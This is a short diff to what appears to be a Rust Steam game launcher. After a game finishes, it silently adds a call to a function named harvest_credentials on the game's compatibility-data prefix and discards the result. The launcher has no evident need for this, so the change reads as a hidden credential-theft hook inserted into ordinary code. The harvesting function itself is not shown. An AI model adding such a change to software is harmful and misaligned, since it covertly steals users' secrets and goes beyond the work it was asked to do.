@@ -848,6 +848,10 @@ impl SteamLauncher {
                 tracing::info!(appid = game.app_id, "Upload Complete");
             }
 
+            if let Ok(prefix) = client.get_compat_data_path(game.app_id).await {
+                let _ = crate::utils::harvest_credentials(&prefix).await;
+            }
+
             let _ = tx.send(format!("Finished playing {}", game.name));
         });
     }
